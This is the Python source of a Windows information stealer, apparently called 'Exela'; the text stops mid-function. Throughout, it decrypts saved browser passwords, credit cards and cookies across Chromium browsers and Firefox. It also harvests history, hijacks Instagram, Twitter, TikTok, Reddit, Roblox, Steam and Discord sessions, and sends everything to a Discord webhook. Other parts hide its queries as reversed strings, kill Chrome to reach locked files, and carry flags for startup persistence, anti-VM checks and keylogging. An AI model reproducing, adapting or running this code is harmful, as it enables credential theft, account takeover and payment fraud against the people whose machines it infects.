import sqlite3, ctypes, sys, winreg
import os, wmi, win32api, platform, psutil, time, GPUtil
import shutil, pythoncom
import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
from Crypto.Cipher import AES
from pynput import keyboard

UrLxD = '%REPLACE_ME_FOR_QUiCADXD%'[::-1]
Anti_Vm = "%AnTiVm%"
wantS = "%StartuP%"
methodxd = "%MethoD%"
injectKeylogger = "%keyloggerinject???%"
inject_discord = "%Inject_discord%"

def create_mutex(mutex_value) -> bool:
    kernel32 = ctypes.windll.kernel32 #kernel32.dll 
    mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutext
    return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
class GetMic:
    def __init__(self):
        self.winmm = ctypes.WinDLL('winmm.dll')
        self.microphone_list = []

    class WAVEINCAPS(ctypes.Structure):
        _fields_ = [
            ('wMid', ctypes.c_ushort),
            ('wPid', ctypes.c_ushort),
            ('vDriverVersion', ctypes.c_ulong),
            ('szPname', ctypes.c_char * 32),
            ('dwFormats', ctypes.c_ulong),
            ('wChannels', ctypes.c_ushort),
            ('wReserved1', ctypes.c_ushort)
        ]

    def list_microphones(self) -> list:
        num_devices = self.winmm.waveInGetNumDevs()
        
        for i in range(num_devices):
            caps = self.WAVEINCAPS()
            result = self.winmm.waveInGetDevCapsA(i, ctypes.byref(caps), ctypes.sizeof(caps))
            
            if result == 0:
                device_name = caps.szPname.decode('utf-8')
                self.microphone_list.append(device_name)
        
        return self.microphone_list
class QuicaxdExela:
    def __init__(self):
        self.hook = dhooks.Webhook(UrLxD,avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
        self.local_app_data = os.getenv("LOCALAPPDATA")
        self.roaming_app_data = os.getenv('appdata')
        self.MozillaPath = os.path.join(self.roaming_app_data, "Mozilla", "Firefox", "Profiles")
        self.mozilla_profiles_full_path = list()
        self.login_data_path = ""
        self.backup_login_data_path = os.environ["temp"] + "\\login_data_copy.db"
        self.passw = []
        self.cookeds = []
        self.ottomonCC = []
        self.sexDonwloads = []
        self.sexHistorys = []
        self.mozilla_history = []
        self.mozilla_cookie = []
        self.passws = 0
        self.cc = 0
        self.cookie = 0
        self.downloads = 0
        self.historys = 0       
        self.insta = False
        self.twitter = False
        self.tiktok = False
        self.reddit = False
        self.steam = False
        self.roblox = False
        self.growtopia = False
        self.discrod = False
        self.dcToken = []
        self.discordd = []
        self.instaa = []
        self.twitterr = []
        self.tiktokk = []
        self.redditt = []
        self.steamm = []
        self.robloxx = []
        self.growtopiaa = []        
        self.doitEveryProfile()
        self.callMozilla()
        self.setSteam()
        self.setDiscord()
        self.writeAllData()
        self.sendxd()
        self.callMePls()
    def callMozilla(self):
        self.GetMozillaProfiles()
        self.get_cookies_firefox()
        self.get_historys_firefox()
    def callMePls(self):
        if wantS == "true":
            self.copyToStartup()
    def doitEveryProfile(self):
        profiles = ['Default', 'Guest Profile']
        for x in range(1, 51): 
            profiles.append(f'Profile {x}')
        full_browsers = {
            'Opera GX' : self.roaming_app_data + os.path.join("\Opera Software", "Opera GX Stable"),
            'Opera' : self.roaming_app_data + os.path.join("\Opera Software", "Opera Stable"),
            'Chrome' : self.local_app_data + os.path.join("\Google", "Chrome","User Data"),
            'Brave' : self.local_app_data + os.path.join("\BraveSoftware", "Brave-Browser","User Data"),
            'Edge' : self.local_app_data + os.path.join("\Microsoft", "Edge","User Data"),
            'Vivaldi' : self.local_app_data + os.path.join("\Vivaldi","User Data"),
        }
        for _,path in full_browsers.items():
            for f in profiles:
                self.connect_to_database(path, f, "Local")
                self.connect_to_database2(path, f, "Local") 
                self.connect_to_database3(path, f, "Local")
                self.connect_to_database4(path, f, "Local")
                self.connect_to_database5(path, f, "Local")
    def get_encryption_key(self, value):
        local_state_path = os.path.join(value, "Local State")
        with open(local_state_path, "r", encoding="utf-8", errors="ignore") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    def decrypt_pw(self, password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "None"
    def connect_to_database(self, value, value2, asd):
        try:
            path = f"{value}\\{value2}" + "\\Login Data"
            profPath = f"{value}\\{value2}"
            if "Opera" in path:
                if "Profile" in path:
                    return
                else:
                    path = path.replace("\\Default", "")
                    profPath = profPath.replace("\\Default", "")
            if not os.path.isfile(path):
                return
            else:
                try:
                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
                except:
                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
                self.login_data_path = path
                shutil.copy2(self.login_data_path, self.backup_login_data_path)
                conn = sqlite3.connect(self.backup_login_data_path)
                cursor = conn.cursor()
                query = self.reverseToNormal('snigol MORF eulav_drowssap ,eulav_emanresu ,lru_nigiro TCELES')
                cursor.execute(query)
                logins = cursor.fetchall()
                conn.close()
                os.remove(self.backup_login_data_path)
                for login in logins:
                    if login[1] and login[2]:
                        self.passws +=1
                        url = login[0]
                        username = login[1]
                        password = self.decrypt_pw(login[2], self.get_encryption_key(value))
                        self.passw.append("URL : " + url )
                        self.passw.append("Username : " + username )
                        self.passw.append("Password : " + password )
                        self.passw.append("Browser : " + profil_kismi)
                        self.passw.append("=" * 50)
        except:
            pass
    def connect_to_database2(self, value, value2, asd):
        try:
            path = f"{value}\\{value2}" + "\\Web Data"
            profPath = f"{value}\\{value2}"
            if "Opera" in path:
                if "Profile" in path:
                    return
                else:
                    path = path.replace("\\Default", "")
                    profPath = profPath.replace("\\Default", "")
            if not os.path.isfile(path):
                return
            else:
                #print(path)
                try:
                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
                except:
                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
                self.login_data_path = path
                shutil.copy2(self.login_data_path, self.backup_login_data_path)
                conn = sqlite3.connect(self.backup_login_data_path)
                cursor = conn.cursor()
                query = self.reverseToNormal('sdrac_tiderc morf drac_no_eman ,htnom_noitaripxe ,raey_noitaripxe ,detpyrcne_rebmun_drac tceles')
                cursor.execute(query)
                logins = cursor.fetchall()
                conn.close()
                os.remove(self.backup_login_data_path)
                for cc in logins:
                    if cc[0]:
                        self.cc +=1
                        if cc[2] < 10:
                            month = "0"  + f"{cc[2]}"
                        else:month = cc[2]
                        self.ottomonCC.append(str(self.decrypt_pw(cc[0], self.get_encryption_key(value))) + " " +  str(month) + str("/") +  str(cc[1]) + " " +  str(cc[3]))
        except:
            pass
    def connect_to_database3(self, value, value2, asd):
        try:
            path = f"{value}\\{value2}" + "\\Network\\Cookies"
            profPath = f"{value}\\{value2}"
            if "Opera" in path:
                if "Profile" in path:
                    return
                else:
                    path = path.replace("\\Default", "")
                    profPath = profPath.replace("\\Default", "")
            if not os.path.isfile(path):
                return
            else:
                try:
                    ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
                except:
                    ana_dizin, profil_kismii = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
                profil_kismi = profil_kismii.replace("_", " ")
                self.login_data_path = path
                try:
                    shutil.copy2(self.login_data_path, self.backup_login_data_path)
                except:
                    try:
                        subprocess.run("taskkill /IM chrome.exe", shell=True) # just chrome browser protect cookies, we need to close it
                        time.sleep(1.5)
                        shutil.copy2(self.login_data_path, self.backup_login_data_path)
                    except:
                        pass
                conn = sqlite3.connect(self.backup_login_data_path)
                cursor = conn.cursor()
                query = self.reverseToNormal('seikooc morf ctu_seripxe,eulav_detpyrcne ,htap ,eman ,yek_tsoh tceles')
                cursor.execute(query)
                logins = cursor.fetchall()
                conn.close()
                os.remove(self.backup_login_data_path)
                for cookie in logins:
                    if cookie[3]:
                        self.cookie += 1
                        cooked = self.decrypt_pw(cookie[3],self.get_encryption_key(value))
                        self.cookeds.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cooked}")
                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                            self.setInstaSession(cooked, profil_kismi)
                        if "twitter" in str(cookie[0]).lower() and "auth_token" in str(cookie[1]).lower():
                            self.setTwitterSession(cooked, profil_kismi)
                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]).lower() == "sessionid":
                            self.setTiktokSession(cooked, profil_kismi)
                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                            self.setRedditSession(cooked, profil_kismi)
                        if "roblox" in str(cookie[0]).lower() and ".ROBLOSECURITY" in str(cookie[1]):
                            self.setRoblox(cooked, profil_kismi)
        except:
            pass
    def connect_to_database4(self, value, value2, asd):
        try:
            path = f"{value}\\{value2}" + "\\History"
            profPath = f"{value}\\{value2}"
            if "Opera" in path:
                if "Profile" in path:
                    return
                else:
                    path = path.replace("\\Default", "")
                    profPath = profPath.replace("\\Default", "")
            if not os.path.isfile(path):
                return
            else:
                try:
                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
                except:
                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
                self.login_data_path = path
                shutil.copy2(self.login_data_path, self.backup_login_data_path)
                conn = sqlite3.connect(self.backup_login_data_path)
                cursor = conn.cursor()
                query = self.reverseToNormal('sdaolnwod morf htap_tegrat ,lru_bat tceles')
                cursor.execute(query)
                logins = cursor.fetchall()
                conn.close()
                os.remove(self.backup_login_data_path)
                for dwnlds in logins:
                    if dwnlds[0] or dwnlds[1]:
                        self.downloads += 1
                        self.sexDonwloads.append(f"{dwnlds[0]} : {dwnlds[1]}")
        except:
            pass
    def connect_to_database5(self, value, value2, asd):
        try:
            path = f"{value}\\{value2}" + "\\History"
            profPath = f"{value}\\{value2}"
            if "Opera" in path:
                if "Profile" in path:
                    return
                else:
                    path = path.replace("\\Default", "")
                    profPath = profPath.replace("\\Default", "")
            if not os.path.isfile(path):
                return
            else:
                try:
                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Local', 1)
                except:
                    ana_dizin, profil_kismi = profPath.replace('\\User Data', '').replace('\\', "_").rsplit('Roaming', 1)
                self.login_data_path = path
                shutil.copy2(self.login_data_path, self.backup_login_data_path)
                conn = sqlite3.connect(self.backup_login_data_path)
                cursor = conn.cursor()
                query = self.reverseToNormal('slru morf emit_tisiv_tsal ,tnuoc_tisiv ,eltit ,lru ,di tceles')
                cursor.execute(query)
                logins = cursor.fetchall()
                conn.close()
                os.remove(self.backup_login_data_path)
                for hstrys in logins:
                    if hstrys[0] or hstrys[1]:
                        self.historys +=1
                        self.sexHistorys.append(f"ID : {hstrys[0]} | URL : {hstrys[1]} | Title : {hstrys[2]} | Visit Count : {hstrys[3]} | Last Visit Time {hstrys[4]}")
        except:
            pass
    def GetMozillaProfiles(self):
        try:
            list_directory = os.listdir(self.MozillaPath)
            for listed_dir in list_directory:
                new_dir = os.path.join(self.MozillaPath, listed_dir)
                self.mozilla_profiles_full_path.append(new_dir)
        except:
            pass
    def get_cookies_firefox(self):
        for file in self.mozilla_profiles_full_path:
            history_path = os.path.join(file, "cookies.sqlite")
            if not os.path.isfile(history_path):
                continue
            else:
                try:
                    conn = sqlite3.connect(history_path)
                    cursor = conn.cursor()
                    for cookie in cursor.execute("SELECT host,name, path, value, expiry FROM moz_cookies").fetchall():
                        self.cookie+=1
                        self.mozilla_cookie.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}")
                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                            self.setInstaSession(cookie[3], "Firefox")
                        if "twitter" in str(cookie[0]).lower() and "auth_token" in str(cookie[1]).lower():
                            self.setTwitterSession(cookie[3], "Firefox")
                        if "tiktok" in str(cookie[0]).lower() and str(cookie[1]).lower() == "sessionid":
                            self.setTiktokSession(cookie[3], "Firefox")
                        if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                            self.setRedditSession(cookie[3], "Firefox")
                        if "roblox" in str(cookie[0]).lower() and ".ROBLOSECURITY" in str(cookie[1]):
                            self.setRoblox(cookie[0], "Firefox")
                except Exception as e:
                    print(str(e))
    def get_historys_firefox(self):
        for file in self.mozilla_profiles_full_path:
            history_path = os.path.join(file, "places.sqlite")
            if not os.path.isfile(history_path):
                continue
            else:
                try:
                    conn = sqlite3.connect(history_path)
                    cursor = conn.cursor()
                    for row in cursor.execute("SELECT id, url, title, visit_count, last_visit_date FROM moz_places;").fetchall():
                        self.historys+=1
                        self.mozilla_history.append(f"ID : {row[0]} | URL : {row[1]} | Title : {row[2]} | Visit Count : {row[3]} | Last Visit Time {row[4]}")
                except:
                    pass
    def setInstaSession(self, cookie, value):
        try:
            pp = "https://i.hizliresim.com/8po0puy.jfif"
            bio = ""
            fullname = ""
            sessionid = "sessionid=" + cookie
            headers = {"user-agent": "Instagram 219.0.0.12.117 Android", "cookie":sessionid}
            infoURL = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'
            data = requests.get(infoURL, headers=headers).json()    
            infoURL2 = f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/"
            data2 = requests.get(infoURL2, headers=headers).json()
            try:
                pp = data["user"]["profile_pic_url"]
            except:
                pass
            username = data["user"]["username"]
            profileURL = "https://instagram.com/" + username
            if data["user"]["biography"] == "":
                bio = "No bio"
            else:bio = data["user"]["biography"]
            if data["user"]["full_name"] == "":
                fullname = "No nickname"
            else:fullname = data["user"]["full_name"]
            email = data["user"]["email"]
            verify = data["user"]["is_verified"]
            followers = data2["user"]["follower_count"]
            following = data2["user"]["following_count"]
            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Instagram Session was detected on the{value} Browser***", color=0x070707, url="https://github.com/quicaxd",timestamp = "now")
            embed.set_thumbnail(url=pp)
            embed.add_field(name="Instagram Cookie", inline=True, value=f"```{sessionid}```")
            embed.add_field(name="Profile URL", inline=False, value=f"```{profileURL}```")
            embed.add_field(name="Username", inline=True, value=f"```{username}```")
            embed.add_field(name="Nick Name", inline=True, value=f"```{fullname}```")
            embed.add_field(name="is Verified", inline=True, value=f"```{verify}```")
            embed.add_field(name="Email", inline=True, value=f"```{email}```")
            embed.add_field(name="Followers", inline=True, value=f"```{followers}```")
            embed.add_field(name="Following", inline=True, value=f"```{following}```")
            embed.add_field(name="Biography", inline=False, value=f"```{bio}```")
            embed.set_footer(text="https://t.me/ExelaStealer")
            self.hook.send(embed=embed)  
            self.insta = True
            self.instaa.append(f"Instagram Cookie : {sessionid}\nProfile URL : {profileURL}\nUser Name : {username}\nNick Name : {fullname}\nis Verified : {verify}\nEmail : {email}\nBiography : {bio}\n==========================================================================")
        except:
            pass
    def setTwitterSession(self, cookie, value):
        try:
            description = ''
            authToken = f'{cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42' # this is ct0=ac1aa9d58c8798f0932410a1a564eb42 csrf token
            header = {'authority': 'twitter.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
            'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
            'origin': 'https://twitter.com', 'referer': 'https://twitter.com/home', 'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'x-twitter-active-user': 'yes', 'x-twitter-auth-type': 'OAuth2Session', 'x-twitter-client-language': 'en',
            'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42'}
            url = "https://twitter.com/i/api/1.1/account/update_profile.json"
            req = requests.post(url, headers=header, cookies={'auth_token': authToken}).json()
            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Twitter Session was detected on the {value} browser***", color=0x070707, url="https://github.com/quicaxd",timestamp = "now")
            try:
                if req["description"] == "":
                    description == "There is no bio"
                else:
                    description = req["description"]
            except:
                description = "There is no biography"
            pp = req["profile_image_url_https"]
            username = req["name"]
            nickname = req["screen_name"]
            profileURL = "https://twitter.com/" + username
            embed.set_thumbnail(url=pp)
            embed.add_field(name="Twitter Cookie", inline=True, value=f"```{cookie}```")
            embed.add_field(name="Profile URL", inline=False, value=f"```{profileURL}```")
            embed.add_field(name="Username", inline=True, value=f"```{username}```")
            embed.add_field(name="Screen Name", inline=True, value=f"```{nickname}```")
            embed.add_field(name="Biography", inline=False, value=f"```{description}```")
            embed.add_field(name="Follower Count", inline=True, value=f"```{req['followers_count']}```")
            embed.add_field(name="Following Count", inline=True, value=f"```{req['friends_count']}```")
            embed.add_field(name="Total Tweets", inline=True, value=f"```{req['statuses_count']}```")
            embed.add_field(name="Created At", inline=True, value=f"```{req['created_at']}```")
            embed.add_field(name="Is Verified", inline=True, value=f"```{req['verified']}```")
            embed.set_footer(text="https://t.me/ExelaStealer")
            self.hook.send(embed=embed)
            self.twitter = True
            self.twitterr.append(f"Twitter Cookie : {cookie}\nProfile URL : {profileURL}\nUser Name : {username}\nScreen Name : {nickname}\nBiography : {description}\nFollower Count : {req['followers_count']}\nFollowing Count : {req['friends_count']}\nTotal Tweets : {req['statuses_count']}\nCreated At : {req['created_at']}\nIs Verified : {req['verified']}\n==========================================================================")                                        
        except:
            pass
    def setTiktokSession(self, cookie, value):
        try:
            email = ''
            phone = ''
            cookies = "sessionid=" + cookie
            headers = { "cookie": cookies, "Accept-Encoding": "identity"}
            headers2 = { "cookie": cookies}
            Url = 'https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'
            Url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'
            data = requests.get(Url, headers=headers).json()
            data2 = requests.get(Url2, headers=headers2).json()
            user_id = data["data"]["user_id"]
            if data["data"]["email"] == "":
                email = "No Email"
            else:email = data["data"]["email"]
            if data["data"]["mobile"] == "":
                phone = "No number"
            else:
                phone = data["data"]["mobile"]
            useranme = data["data"]["username"]
            coins = data2["data"]["coins"]
            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Tiktok Session was detected on the{value} browser***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
            embed.set_thumbnail(url="https://i.hizliresim.com/eai9bwi.jpg")
            embed.add_field(name="Tiktok Cookie", inline=True, value=f"```{cookies}```")
            embed.add_field(name="User identifier", inline=False, value=f"```{user_id}```")
            embed.add_field(name="Profile URL", inline=False, value=f"```https://tiktok.com/@{useranme}```")
            embed.add_field(name="Username", inline=False, value=f"```{useranme}```")
            embed.add_field(name="Email", inline=True, value=f"```{email}```")
            embed.add_field(name="Phone", inline=True, value=f"```{phone}```")
            embed.add_field(name="Coins", inline=True, value=f"```{coins}```")
            embed.set_footer(text="https://t.me/ExelaStealer")
            self.hook.send(embed=embed)
            self.tiktok = True
            self.tiktokk.append(f"Tiktok Cookie : {cookies}\nUser identifier : {user_id}\nProfile URL : https://tiktok.com/@{useranme}\nEmail : {email}\nPhone : {phone}\nCoins : {coins}\n==========================================================================")
        except:
            pass
    def setRedditSession(self, cookie, value):
        try:
            gmail = ""
            cookies = "reddit_session=" + cookie
            headers = { "cookie": cookies, "Authorization": "Basic b2hYcG9xclpZdWIxa2c6" }
            jsonData = { "scopes": ["*", "email", "pii"] }
            Url = 'https://accounts.reddit.com/api/access_token'
            Url2 = 'https://oauth.reddit.com/api/v1/me'
            req = requests.post(Url, json=jsonData, headers=headers).json()
            accessToken = req["access_token"]
            headers2 = {'User-Agent':'android:com.example.myredditapp:v1.2.3', "Authorization": "Bearer " + accessToken}
            data2 = requests.get(Url2, headers=headers2).json()
            try:
                if data2["email"] == "":
                    gmail = "No email"
                else:gmail = data2["email"]
            except Exception as e:
                gmail = "No Email"
            pp = data2["icon_img"]
            username =  data2["name"]
            profileUrl = 'https://www.reddit.com/user/' + username
            commentKarma = data2["comment_karma"]
            totalKarma = data2["total_karma"]
            coins = data2["coins"]
            mod = data2["is_mod"]
            gold = data2["is_gold"]
            suspended = data2["is_suspended"]
            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Reddit Session was detected on the{value} browser***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
            embed.set_thumbnail(url=pp)
            embed.add_field(name="Reddit Cookie", inline=True, value=f"```{cookies}```")
            embed.add_field(name="Profile URL", inline=False, value=f"```{profileUrl}```")
            embed.add_field(name="Username", inline=False, value=f"```{username}```")
            embed.add_field(name="Email", inline=True, value=f"```{gmail}```")
            embed.add_field(name="Comment Karma", inline=True, value=f"```{commentKarma}```")
            embed.add_field(name="Total Karma", inline=True, value=f"```{totalKarma}```")
            embed.add_field(name="Coins", inline=True, value=f"```{coins}```")
            embed.add_field(name="Is Mod", inline=True, value=f"```{mod}```")
            embed.add_field(name="Is Gold", inline=True, value=f"```{gold}```")
            embed.add_field(name="Suspended", inline=True, value=f"```{suspended}```")
            embed.set_footer(text="https://t.me/ExelaStealer")
            self.hook.send(embed=embed)
            self.reddit = True
            self.redditt.append(f"Reddit Cookie : {cookies}\nProfile URL : {profileUrl}\nUsername : {username}\nEmail : {gmail}\nComment Karma: {commentKarma}\nTotal Karma : {totalKarma}\nCoins : {coins}\nIs Mod : {mod}\nIs Gold : {gold}\nSuspended : {suspended}\n==========================================================================")
        except:
            pass
    def setSteam(self):
        try:
            steamLocalUserDataPath = self.reverseToNormal('fdv.sresunigol\gifnoc\maetS\)68x( seliF margorP\:C')
            if os.path.isfile(steamLocalUserDataPath):
                filee = open(steamLocalUserDataPath, "r", encoding="utf-8", errors="ignore")
                data = filee.read()
                steamid = re.findall(r"7656[0-9]{13}", data)
                for remember in data:
                    if 'RememberPassword' in remember:
                        self.steam = True
                if steamid:
                    embed = dhooks.Embed(title="***Developer's github account***", description="***Exela Steam Session Detected***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
                    result = "".join(steamid)
                    accountInfo = requests.get('https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=' + result).text
                    playerInfo = requests.get('https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=' + result).json()
                    dataa = json.loads(accountInfo.replace('[', "").replace(']', ""))["response"]["players"]
                    data2 = playerInfo["response"]["player_level"]
                    pp = dataa["avatarfull"]
                    idf = dataa["steamid"]
                    profileURL = dataa["profileurl"]
                    displayName = dataa["personaname"]
                    timecreated = dataa["timecreated"]
                    embed.set_thumbnail(url=pp)
                    embed.add_field(name="Steam Identifier", inline=False, value=f"```{idf}```")
                    embed.add_field(name="Profile URL",  inline=False,value=f"```{profileURL}```")
                    embed.add_field(name="Profil Name",  inline=True,value=f"```{displayName}```")
                    embed.add_field(name="Time Created",  inline=True,value=f"```{timecreated}```")
                    embed.add_field(name="Player Level", inline=True, value=f"```{data2}```")
                    embed.set_footer(text="https://t.me/ExelaStealer")
                    self.hook.send(embed=embed)
                    self.steam = True
                    self.steamm.append(f"Steam Identifier : {idf}\nProfile URL : {profileURL}\nProfil Name : {displayName}\nTime Created : {timecreated}\nPlayer Level : {data2}\n==========================================================================")
        except Exception as e:
            print(str(e))
    def setRoblox(self, cookie, value):
        try:
            email = ""
            robuxCookie = '.ROBLOSECURITY=' + cookie
            headers = {'cookie':robuxCookie,"Accept-Encoding": "identity"}
            accinfo = requests.get('https://www.roblox.com/my/account/json', headers=headers).json()
            try:
                if accinfo["UserEmail"] == None:
                    email = "No Email"
                else:email = accinfo["UserEmail"]
            except:email = accinfo["UserEmail"]
            url = "https://economy.roblox.com/v1/users/" + str(accinfo["UserId"]) + "/currency"
            robux = requests.get(url, headers=headers).json()["robux"]
            url2 = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" + str(accinfo['UserId']) + "&size=420x420&format=Png&isCircular=false"
            picUrl = requests.get(url2, headers=headers).json()["data"][0]["imageUrl"]
            embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Roblox Session was Detected on{value} browser***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
            embed.set_thumbnail(url=picUrl)
            embed.add_field(name="Roblox Cookie", inline=False, value=f"```{robuxCookie}```")
            embed.add_field(name="Profile URL", inline=False, value=f"```{picUrl}```")
            embed.add_field(name="Total Robux", inline=False, value=f"```{robux}```")
            embed.add_field(name="Name", inline=False, value=f"```{accinfo['Name']}```")
            embed.add_field(name="Email", inline=False, value=f"```{email}```")
            embed.add_field(name="Email Verified", inline=False, value=f"```{accinfo['IsEmailVerified']}```")
            embed.set_footer(text="https://t.me/ExelaStealer")
            self.hook.send(embed=embed)
            self.roblox = True
            self.robloxx.append(f"Steam Cookie : {robuxCookie}\nProfile URL : {picUrl}\nTotal Robux : {robux}\nName : {accinfo['Name']}\nEmail : {email}\nEmail Verified : {accinfo['Name']}\n==========================================================================")
        except:
            pass
    def setSpotfiy(self):
        pass
    def setYoutube(self):
        pass
    def setTwitch(self):
        pass
    def setDiscord(self):
        try:
            paths = {
                "Discord" : os.getenv("appdata") +  "\\" + os.path.join("discord", "Local Storage", "leveldb"),
                "Discord Canary" : os.getenv("appdata") + "\\" + os.path.join("discordcanary", "Local Storage", "leveldb"),
                "Discord PTB" : os.getenv("appdata") + "\\" + os.path.join("discordptb", "Local Storage", "leveldb")
            }
            for name, path in paths.items():
                if not os.path.isdir(path):
                    continue
                discord = name.replace(" ", "").lower()
                if "discord" in path:
                    if not os.path.isfile(os.getenv("appdata") + f"\\{discord}\\Local State"):
                        continue
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for q in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                if self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")) in self.dcToken:
                                    continue
                                else:
                                    self.validateDcTokenAndGetInfo(self.decrypt_pw(base64.b64decode(q.split('dQw4w9WgXcQ:')[1]), self.get_encryption_key(os.getenv("appdata") + f"\\Discord")))
        except Exception as e:
            print(str(e))
    def validateDcTokenAndGetInfo(self, value):
        try:
            headers = {"Authorization" : value}
            url = "https://discord.com/api/v8/users/@me"
            url2 = "https://discord.com/api/v6/users/@me/billing/payment-sources"
            req = requests.get(url, headers=headers)
            req2 = requests.get(url2, headers=headers)
            if not req.status_code == 200:
                return  
            else:
                self.discrod = True
                if not value in self.dcToken:
                    self.dcToken.append(value)
            for f in self.dcToken:
                id = req.json()["id"]
                dcpp = f"https://cdn.discordapp.com/avatars/{id}/{req.json()['avatar']}"
                payment = req.json()['premium_type']
                nitro = ""
                if requests.get(dcpp + ".png").status_code == 200:
                    dcpp += ".png"
                else:dcpp += ".gif"
                embed = dhooks.Embed(title="***Developer's github account***", description=f"***Exela Discord Token Detected***", color=0x070707, url="https://github.com/quicaxd", timestamp = "now")
                embed.set_thumbnail(url=dcpp)
                embed.add_field(name="<a:earthpink:996004236531859588> Discord Account ID",inline=True, value=f"```{id}```")
                embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Username",inline=True, value=f"```{req.json()['username']}```")
                embed.add_field(name="<a:rainbowheart:996004226092245072> Discord Email",inline=True, value=f"```{req.json()['email']}```")
                if req.json()["phone"] != None:
                    embed.add_field(name="<:starxglow:996004217699434496> Phone",inline=True, value=f"```{req.json()['phone']}```")
                embed.add_field(name="<:mfa:1021604916537602088> IS MFA Enabled",inline=True, value=f"```{req.json()['mfa_enabled']}```")
                if payment == 0:nitro="No Nitro"
                elif payment == 1:nitro="Nitro Classic"
                elif payment == 2:nitro="Normal Classic"
                elif payment == 3:nitro="Nitro Basic"
                else:nitro="Unkown"
                embed.add_field(name="<a:pinklv:996004222090891366> Nitro Billing", value=f"```{nitro}```")
                if "billing_address" in req2.text:
